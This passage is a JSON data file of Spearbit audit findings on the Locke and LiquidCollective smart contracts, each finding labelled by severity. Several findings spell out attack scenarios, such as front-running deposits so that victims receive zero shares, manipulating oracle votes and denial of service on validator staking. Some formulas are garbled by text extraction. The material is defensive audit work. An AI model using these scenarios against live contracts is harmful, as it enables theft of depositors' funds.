        "body": "Add sanity check on the reward tokens decimals, which shouldnt exceed 33 because Token- Stream.rewards has a uint112 type. constructor( ) { uint64 _streamId, address creator, bool _isIndefinite, address _rewardToken, address _depositToken, uint32 _startTime, uint32 _streamDuration, uint32 _depositLockDuration, uint32 _rewardLockDuration, uint16 _feePercent, bool _feeEnabled LockeERC20( _depositToken, _streamId, _startTime + _streamDuration + _depositLockDuration, _startTime + _streamDuration, _isIndefinite ) MinimallyExternallyGoverned(msg.sender) // inherit factory governance // No error code or msg to reduce bytecode size require(_rewardToken != _depositToken); // set fee info feePercent = _feePercent; feeEnabled = _feeEnabled; // limit feePercent require(feePercent < 10000); // store streamParams startTime = _startTime; streamDuration = _streamDuration; // set in shared state 12 endStream = startTime + streamDuration; endDepositLock = endStream + _depositLockDuration; endRewardLock = startTime + _rewardLockDuration; // set tokens depositToken = _depositToken; rewardToken = _rewardToken; // set streamId streamId = _streamId; // set indefinite info isIndefinite = _isIndefinite; streamCreator = creator; uint256 one = ERC20(depositToken).decimals(); if (one > 33) revert BadERC20Interaction(); depositDecimalsOne = uint112(10**one); // set lastUpdate to startTime to reduce codesize and first users gas lastUpdate = startTime; }",
        "labels": [
            "Spearbit",
            "Locke",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Use a stricter bound for transferability delay",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf",
        "body": "modifier transferabilityDelay { // ensure the time is after end stream if (block.timestamp < endStream) revert NotTransferableYet(); _; }",
        "labels": [
            "Spearbit",
            "Locke",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Potential issue with malicious stream creator",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf",
        "body": "Assume that users staked tokens at the beginning. The malicious stream creator could come and stake an extremely large amount of tokens thus driving up the value of totalVirtualBalance. This means that users will barely receive rewards while giving away deposit tokens at the same rate. Users can exit the pool in this case to save their unstreamed tokens. 13 function rewardPerToken() public override view returns (uint256) { if (totalVirtualBalance == 0) { return cumulativeRewardPerToken; } else { unchecked { rewards = (uint256(lastApplicableTime() - lastUpdate) * rewardTokenAmount * ,! depositDecimalsOne) / streamDuration / totalVirtualBalance; } return cumulativeRewardPerToken + rewards; } }",
        "labels": [
            "Spearbit",
            "Locke",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Moving check require(feePercent < 10000) in updateFeeParams to save gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf",
        "body": "feePercent comes directly from LockeFactorys feeParams.feePercent, which is configured in the updateFeeParams function and used across all Stream contracts. Moving this check into the updateFeeParams function can avoid checking in every contract and thus save gas.",
        "labels": [
            "Spearbit",
            "Locke",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Use calldata instead of memory for some function parameters",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf",
        "body": "Having function arguments in calldata instead of memory is more optimal in the aforementioned cases. See the following reference.",
        "labels": [
            "Spearbit",
            "Locke",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Update cumulativeRewardPerToken only once after stream ends",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf",
        "body": "Since cumulativeRewardPerToken does not change once it is updated after the stream ends, it has to be updated only once.",
        "labels": [
            "Spearbit",
            "Locke",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Expression 10**one can be unchecked",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf",
        "body": "uint256 one = ERC20(depositToken).decimals(); if (one > 33) revert BadERC20Interaction(); depositDecimalsOne = uint112(10**one)",
        "labels": [
            "Spearbit",
            "Locke",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Calculation of amt can be unchecked",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf",
        "body": "The value newBal in this context is always greater than prevBal because of the check located at Locke.sol#534. Therefore, we can use unchecked subtraction.",
        "labels": [
            "Spearbit",
            "Locke",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Change lastApplicableTime() to endStream",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf",
        "body": "Since block.timestamp >= endStream in the abovementioned cases the lastApplicableTime function will always return endStream.",
        "labels": [
            "Spearbit",
            "Locke",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Simplifying code logic",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf",
        "body": "if (timestamp < lastUpdate) { return tokens; } uint32 acctTimeDelta = timestamp - lastUpdate; if (acctTimeDelta > 0) { uint256 streamAmt = uint256(acctTimeDelta) * tokens / (endStream - lastUpdate); return tokens - uint112(streamAmt); } else { return tokens; } 17 function currDepositTokensNotYetStreamed(IStream stream, address who) external view returns (uint256) { unchecked { uint32 timestamp = uint32(block.timestamp); (uint32 startTime, uint32 endStream, ,) = stream.streamParams(); if (block.timestamp >= endStream) return 0; ( uint256 lastCumulativeRewardPerToken, uint256 virtualBalance, uint112 rewards, uint112 tokens, uint32 lastUpdate, bool merkleAccess ) = stream.tokenStreamForAccount(address(who)); if (timestamp < lastUpdate) { return tokens; } uint32 acctTimeDelta = timestamp - lastUpdate; if (acctTimeDelta > 0) { uint256 streamAmt = uint256(acctTimeDelta) * tokens / (endStream - lastUpdate); return tokens - uint112(streamAmt); } else { return tokens; } } }",
        "labels": [
            "Spearbit",
            "Locke",
            "Severity: Informational"
        ]
    },
    {
        "title": "Operators._hasFundableKeys returns true for operators that do not have fundable keys",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "Because _hasFundableKeys uses operator.stopped in the check, an operator without fundable keys be validated and return true. Scenario: Op1 has  keys = 10  limit = 10  funded = 10  stopped = 10 This means that all the keys got funded, but also \"exited\". Because of how _hasFundableKeys is made, when you call _hasFundableKeys(op1) it will return true even if the operator does not have keys available to be funded. By returning true, the operator gets wrongly included in getAllFundable returned array. That function is critical because it is the one used by pickNextValidators that picks the next validator to be selected and stake delegate user ETH. Because of this issue in _hasFundableKeys also the issue OperatorsRegistry._getNextValidatorsFromActive- Operators can DOS Alluvial staking if there's an operator with funded==stopped and funded == min(limit, keys) can happen DOSing the contract that will always make pickNextValidators return empty. Check Appendix for a test case to reproduce this issue.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "OperatorsRegistry._getNextValidatorsFromActiveOperators can DOS Alluvial staking if there's an operator with funded==stopped and funded == min(limit, keys)",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "This issue is also related to OperatorsRegistry._getNextValidatorsFromActiveOperators should not consider stopped when picking a validator . Consider a scenario where we have Op at index 0 name op1 active true limit 10 funded 10 stopped 10 keys 10 Op at index 1 name op2 active true limit 10 funded 0 stopped 0 keys 10 In this case,  Op1 got all 10 keys funded and exited. Because it has keys=10 and limit=10 it means that it has no more keys to get funded again.  Op2 instead has still 10 approved keys to be funded. Because of how the selection of the picked validator works uint256 selectedOperatorIndex = 0; for (uint256 idx = 1; idx < operators.length;) { if ( operators[idx].funded - operators[idx].stopped < operators[selectedOperatorIndex].funded - operators[selectedOperatorIndex].stopped ) { selectedOperatorIndex = idx; } unchecked { ++idx; } } When the function finds an operator with funded == stopped it will pick that operator because 0 < operators[selectedOperatorIndex].funded - operators[selectedOperatorIndex].stopped. After the loop ends, selectedOperatorIndex will be the index of an operator that has no more validators to be funded (for this scenario). Because of this, the following code uint256 selectedOperatorAvailableKeys = Uint256Lib.min( operators[selectedOperatorIndex].keys, operators[selectedOperatorIndex].limit ) - operators[selectedOperatorIndex].funded; when executed on Op1 it will set selectedOperatorAvailableKeys = 0 and as a result, the function will return return (new bytes[](0), new bytes[](0));. 13 In this scenario when stopped==funded and there are no keys available to be funded (funded == min(limit, keys)) the function will always return an empty result, breaking the pickNextValidators mechanism that won't be able to stake user's deposited ETH anymore even if there are operators with fundable validators. Check the Appendix for a test case to reproduce this issue.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "Oracle.removeMember could, in the same epoch, allow members to vote multiple times and other members to not vote at all",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "The current implementation of removeMember is introducing an exploit that allows an oracle member to vote again and again (in the same epoch) and an oracle that has never voted is prevented from voting (in the same epoch). Because of how OracleMembers.deleteItem is implemented, it will swap the last item of the array with the one that will be deleted and pop the last element. Let's make an example: 1) At T0 m0 to the list of members  members[0] = m0. 2) At T1 m1 to the list of members  members[1] = m1. 3) At T3 m0 call reportBeacon(...). By doing that, ReportsPositions.register(uint256(0)); will be called, registering that the member at index 0 has registered the vote. 4) At T4, the oracle admin call removeMember(m0). This operation, as we said, will swap the member's address from the last position of the array of members with the position of the member that will be deleted. After doing that will pop the last position of the array. The state changes from members[0] = m0; members[1] = m1 to members[0] = m1;. At this point, the oracle member m1 will not be able to vote during this epoch because when he/she will call reportBeacon(...) the function will enter inside the check. if (ReportsPositions.get(uint256(memberIndex))) { revert AlreadyReported(_epochId, msg.sender); } This is because int256 memberIndex = OracleMembers.indexOf(msg.sender); will return 0 (the position of the m0 member that have already voted) and ReportsPositions.get(uint256(0)) will return true. At this point, if for whatever reason an admin of the contract add again the deleted oracle, it would be added to the position 1 of the array of the members, allowing the same member that have already voted, to vote again. Note: while the scenario where a removed member can vote multiple time would involve a corrupted admin (that would re-add the same member) the second scenario that prevent a user to vote would be more common. Check the Appendix for a test case to reproduce this issue. 14",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Order of calls to removeValidators can affect the resulting validator keys set",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "If two entities A and B (which can be either the admin or the operator O with the index I) send a call to removeValidators with 2 different set of parameters:  T1 : (I, R1)  T2 : (I, R2) Then depending on the order of transactions, the resulting set of validators for this operator might be different. And since either party might not know a priori if any other transaction is going to be included on the blockchain after they submit their transaction, they don't have a 100 percent guarantee that their intended set of validator keys are going to be removed. This also opens an opportunity for either party to DoS the other party's transaction by frontrunning it with a call to remove enough validator keys to trigger the InvalidIndexOutOfBounds error: OperatorsRegistry.1.sol#L324-L326: if (keyIndex >= operator.keys) { revert InvalidIndexOutOfBounds(); } to removeValidators and compare it",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Non-zero operator.limit should always be greater than or equal to operator.funded",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "For the subtraction operation in OperatorsRegistry.1.sol#L428-L430 to not underflow and revert, there should be an assumption that operators[selectedOperatorIndex].limit >= operators[selectedOperatorIndex].funded Perhaps this is a general assumption, but it is not enforced when setOperatorLimits is called with a new set of limits.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Decrementing the quorum in Oracle in some scenarios can open up a frontrunning/backrunning opportunity for some oracle members",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "Assume there are 2 groups of oracle members A, B where they have voted for report variants Va and Vb respectively. Let's also assume the count for these variants Ca and Cb are equal and are the highest variant vote counts among all possible variants. If the Oracle admin changes the quorum to a number less than or equal to Ca + 1 = Cb + 1, any oracle member can backrun this transaction by the admin to decide which report variant Va or Vb gets pushed to the River. This is because when a lower quorum is submitted by the admin and there exist two variants that have the highest number of votes, in the _getQuorumReport function the returned isQuorum parameter would be false since repeat == 0 is false: Oracle.1.sol#L369: return (maxval >= _quorum && repeat == 0, variants[maxind]); Note that this issue also exists in the commit hash 030b52feb5af2dd2ad23da0d512c5b0e55eb8259 and can be triggered by the admin either by calling setQuorum or addMember when the abovementioned conditions are met. Also, note that the free oracle member agent can frontrun the admin transaction to decide the quorum earlier in the scenario above. Thus this way _getQuorumReport would actually return that it is a quorum.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "_getNextValidatorsFromActiveOperators can be tweaked to find an operator with a better validator pool",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "Assume for an operator: (A, B) = (funded - stopped, limit - funded) The current algorithm finds the first index in the cached operators array with the minimum value for A and tries to gather as many publicKeys and signatures from this operator's validators up to a max of _requestedAmount. But there is also the B cap for this amount. And if B is zero, the function returns early with empty arrays. Even though there could be other approved and non-funded validators from other operators. Related: OperatorsRegistry._getNextValidatorsFromActiveOperators should not consider stopped when picking a validator , OperatorsRegistry._getNextValidatorsFromActiveOperators can DOS Alluvial staking if there's an operator with funded==stopped and funded == min(limit, keys) , _hasFundableKeys marks operators that have no more fundable validators as fundable.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Dust might be trapped in WlsETH when burning one's balance.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "It is not possible to burn the exact amount of minted/deposited lsETH back because of the _value provided to burn is in ETH. Assume we've called mint(r,v) with our address r, then to get the v lsETH back to our address, we need to find an x where v = bx S B c and call burn(r, x) (Here S represents the total share of lsETH and B the total underlying value.). It's not always possible to find the exact x. So there will always be an amount locked in this contract ( v (cid:0) bx S B c ). These dust amounts can accumulate from different users and turn into a big number. To get the full amount back, the user needs to mint more wlsETH tokens so that we can find an exact solution to v = bx S B c. The extra amount to get the locked-up fees back can be engineered. The same problem exists for transfer and transferFrom. Also note, if you have minted x amount of shares, the balanceOf would tell you that you own b = b xB S c wlsETH. Internally wlsETH keeps track of the shares x. So users think they can only burn b amount, plug that in for the _value and in this case, the number of shares burnt would be b xB S cS B % $ which has even more rounding errors. wlsETH could internally track the underlying but that would not appropriate value like lsETH, which would basically be kind of wETH. We think the issue of not being able to transfer your full amount of shares is not as serious as not being able to burn back your shares into lsETH. On the same note, we think it would be beneficial to expose the wlsETH share amount to the end user: function sharesBalanceOf(address _owner) external view returns (uint256 shares) { return BalanceOf.get(_owner); }",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "BytesLib.concat can potentailly return results with dirty byte paddings.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "concat does not clean the potential dirty bytes that might have been copied from _postBytes (nor does it clean the padding). The dirty bytes from _postBytes are carried over to the padding for tempBytes.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "The reportBeacon is prone to front-running attacks by oracle members",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "There could be a situation where the oracle members are segmented into 2 groups A and B , and members of the group A have voted for the report variant Va and the group B for Vb . Also, let's assume these two variants are 1 vote short of quorum. Then either group can try to front-run the other to push their submitted variant to river.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Shares distributed to operators suffer from rounding error",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "_rewardOperators distribute a portion of the overall shares distributed to operators based on the number of active and funded validators that each operator has. The current number of shares distributed to a validator is calculated by the following code _mintRawShares(operators[idx].feeRecipient, validatorCounts[idx] * rewardsPerActiveValidator); where rewardsPerActiveValidator is calculated as uint256 rewardsPerActiveValidator = _reward / totalActiveValidators; This means that in reality each operator receives validatorCounts[idx] * (_reward / totalActiveValida- tors) shares. Such share calculation suffers from a rounding error caused by division before multiplication.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "OperatorsRegistry._getNextValidatorsFromActiveOperators should not consider stopped when picking a validator",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "Note that  limited  number of validators (already pushed by op) that have been approved by Alluvial and can be selected to be funded.  funded  number of validators funded.  stopped  number of validators exited (so that were funded at some point but for any reason they have exited the staking). The implementation of the function should favor operators that have the highest number of available validators to be funded. Nevertheless functions favor validators that have stopped value near the funded value. Consider the following example: Op at index 0 name op1 active true limit 10 funded 5 stopped 5 keys 10 Op at index 1 name op2 active true limit 10 funded 0 stopped 0 keys 10 1) op1 and op2 have 10 validators whitelisted. 2) op1 at time1 get 5 validators funded. 3) op1 at time2 get those 5 validators exited, this mean that op.stopped == 5. In this scenario, those 5 validators would not be used because they are \"blacklisted\". At this point  op1 have 5 validators that can be funded. 24  op2 have 10 validators that can be funded. pickNextValidators logic should favor operators that have the higher number of available keys (not funded but approved) to be funded. If we run operatorsRegistry.pickNextValidators(5); the result is this Op at index 0 name op1 active true limit 10 funded 10 stopped 5 keys 10 Op at index 1 name op2 active true limit 10 funded 0 stopped 0 keys 10 Op1 gets all the remaining 5 validators funded, the function (from the specification of the logic) should instead have picked Op2. Check the Appendix for a test case to reproduce this issue.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "approve() function can be front-ran resulting in token theft",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "The approve() function has a known race condition that can lead to token theft. If a user calls the approve function a second time on a spender that was already allowed, the spender can front-run the transaction and call transferFrom() to transfer the previous value and still receive the authorization to transfer the new value.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Add missing input validation on constructor/initializer/setters",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "Allowlist.1.sol  initAllowlistV1 should require the _admin parameter to be not equal to address(0). This check is not needed if issue LibOwnable._setAdmin allows setting address(0) as the admin of the contract is implemented directly at LibOwnable._setAdmin level.  allow should check _accounts[i] to be not equal to address(0). Firewall.sol  constructor should check that: governor_ != address(0). executor_ != address(0). destination_ != address(0).  setGovernor should check that newGovernor != address(0).  setExecutor should check that newExecutor != address(0). OperatorsRegistry.1.sol  initOperatorsRegistryV1 should require the _admin parameter to be not equal to address(0). This check is not needed if issue LibOwnable._setAdmin allows setting address(0) as the admin of the contract is implemented directly at LibOwnable._setAdmin level.  addOperator should check: _name to not be an empty string. _operator to not be address(0). _feeRecipi- ent to not be address(0).  setOperatorAddress should check that _newOperatorAddress is not address(0).  setOperatorFeeRecipientAddress should check that _newOperatorFeeRecipientAddress is not address(0).  setOperatorName should check that _newName is not an empty string. Oracle.1.sol  initOracleV1 should require the _admin parameter to be not equal to address(0). This check is not needed if issue LibOwnable._setAdmin allows setting address(0) as the admin of the contract is implemented directly at LibOwnable._setAdmin level. Consider also adding some min and max limit to the values of _annualAprUpperBound and _relativeLowerBound and be sure that _epochsPerFrame, _slotsPerEpoch, _secondsPerSlot and _genesisTime matches the values expected.  addMember should check that _newOracleMember is not address(0).  setBeaconBounds: Consider adding min/max value that _annualAprUpperBound and _relativeLowerBound should respect. River.1.sol  initRiverV1: _globalFee should follow the same validation done in setGlobalFee. Note that client said that 0 is a valid _- globalFee value \"The revenue redistributuon would be computed off-chain and paid by the treasury in that case. It's still an on-going discussion they're having at Alluvial.\" _operatorRewardsShare should follow the same validation done in setOperatorRewardsShare. Note that client said that 0 is a valid _operatorRewardsShare value \"The revenue redistributuon would be computed off-chain and paid by the treasury in that case. It's still an on-going discussion they're having at Alluvial.\" ConsensusLayerDepositManager.1.sol  initConsensusLayerDepositManagerV1: _withdrawalCredentials should not be empty and follow the re- quirements expressed in the following official Consensus Specs document. 26",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "LibOwnable._setAdmin allows setting address(0) as the admin of the contract",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "While other contracts like RiverAddress (for example) do not allow address(0) to be used as set input parameter, there is no similar check inside LibOwnable._setAdmin. Because of this, contracts that call LibOwnable._setAdmin with address(0) will not revert and functions that should be callable by an admin cannot be called anymore. This is the list of contracts that import and use the LibOwnable library  AllowlistV1  OperatorsRegistryV1  OracleV1  RiverV1",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "OracleV1.getMemberReportStatus returns true for non existing oracles",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "memberIndex will be equal to -1 for non-existing oracles, which will cause the mask to be equal to 0, which will cause the function to return true for non-existing oracles.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Operators might add the same validator more than once",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "Operators can use OperatorsRegistryV1.addValidators to add the same validator more than once. Depositors' funds will be directed to these duplicated addresses, which in turn, will end up having more than 32 eth. This act will damage the capital efficiency of the entire deposit pool and thus will potentially impact the pool's APY.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "OracleManager.setBeaconData possible front running attacks",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "The system is designed in a way that depositors receive shares (lsETH) in return for their eth de- posit. A share represents a fraction of the total eth balance of the system in a given time. Investors can claim their staking profits by withdrawing once withdrawals are active in the system. Profits are being pulled from ELFeeRe- cipient to the River contract when the oracle is calling OracleManager.setBeaconData. setBeaconData updates BeaconValidatorBalanceSum which might be increased or decreased (as a result of slashing for instance). Investors have the ability to time their position in two main ways:  Investors might time their deposit just before profits are being distributed, thus harvesting profits made by others.  Investors might time their withdrawal / sell lsETH on secondary markets just before the loss is realized. By doing this, they will effectively avoid the loss, escaping the intended mechanism of socializing losses.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "SharesManager._mintShares - Depositors may receive zero shares due to front-running",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "The number of shares minted to a depositor is determined by (_underlyingAssetValue * _total- Supply()) / oldTotalAssetBalance. Potential attackers can spot a call to UserDepositManagerV1._deposit and front-run it with a transaction that sends wei to the contract (by self-destructing another contract and sending the funds to it), causing the victim to receive fewer shares than what he expected. More specifically, In case old- TotalAssetBalance() is greater than _underlyingAssetValue * _totalSupply(), then the number of shares the depositor receives will be 0, although _underlyingAssetValue will be still pulled from the depositors balance. An attacker with access to enough liquidity and to the mem-pool data can spot a call to UserDepositManagerV1._- deposit and front-run it by sending at least totalSupplyBefore * (_underlyingAssetValue - 1) + 1 wei to the contract . This way, the victim will get 0 shares, but _underlyingAssetValue will still be pulled from its account balance. In this case, the attacker does not necessarily have to be a whitelisted user, and it is important to mention that the funds that were sent by him can not be directly claimed back, rather, they will increase the price of the share. The attack vector mentioned above is the general front runner case, the most profitable attack vector will be the case where the attacker is able to determine the share price (for instance if the attacker mints the first share). In this scenario, the attacker will need to send at least attackerShares * (_underlyingAssetValue - 1) + 1 to the contract, (attackerShares is completely controlled by the attacker, and thus can be 1). In our case, depositors are whitelisted, which makes this attack harder for a foreign attacker.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Orphaned (index, values) in SlotOperator storage slots in operatorsRegistry",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "If !opExists corresponds to an operator which has OperatorResolution.active set to false, the line below can leave some orphaned (index, values) in SlotOperator storage slots: _setOperatorIndex(name, newValue.active, r.value.length - 1);",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "OperatorsRegistry.setOperatorName Possible front running attacks",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "1. setOperatorName reverts for an already used name, which means that a call to setOperatorName might be front-ran using the same name. The front-runner can launch the same attack again and again thus causing a DoS for the original caller. 2. setOperatorName can be called either by an operator (to edit his own name) or by the admin. setOpera- torName will revert for an already used _newName. setOperatorName caller might be front-ran by the identical transaction transmitted by someone else, which will lead to failure for his transaction, where in practice this failure is a \"false failure\" since the desired change was already made.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Low"
        ]
    },
    {
        "title": "Prevent users from burning token via lsETH/wlsETH transfer or transferFrom functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "The current implementation of both lsETH (SharesManager component of River contract) and wlsETH allow the user to \"burn\" tokens, sending them directly to the address(0) via the transfer and transferFrom function. By doing that, it would bypass the logic of the existing burn functions present right now (or in the future when withdrawals will be enabled in River) in the protocol.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "In addOperator when emitting an event use stack variables instead of reading from memory again",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "In OperatorsRegistry's addOperator function when emitting the AddedOperator event we read from memory all the event parameters except operatorIndex. emit AddedOperator(operatorIndex, newOperator.name, newOperator.operator, newOperator.feeRecipient); We can avoid reading from memory to save gas.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Rewrite pad64 so that it doesn't use BytesLib.concat and BytesLib.slice to save gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "We can avoid using the BytesLib.concat and BytesLib.slice and write pad64 mostly in assembly. Since the current implementation adds more memory expansion than needed (also not highly optimized).",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Cache r.value.length used in a loop condition to avoid reading from the storage multiple times.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "In a loop like the one below, consider caching r.value.length value to avoid reading from storage on every round of the loop. for (uint256 idx = 0; idx < r.value.length;) {",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Rewrite the for loop in ValidatorKeys.sol::getKeys to save gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Operators.get in _getNextValidatorsFromActiveOperators can be replaced by Opera- tors.getByIndex to avoid extra operations/gas.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "Operators.get in _getNextValidatorsFromActiveOperators performs multiple checks that have been done before when Operators.getAllFundable() was called. This includes finding the index, and checking if OperatorResolution.active is set. These are all not necessary.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Avoid unnecessary equality checks with true in if statements",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "Statements of the type if( condition == true) can be replaced with if(condition). The extra comparison with true is redundant.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Rewrite OperatorRegistry.getOperatorDetails to save gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
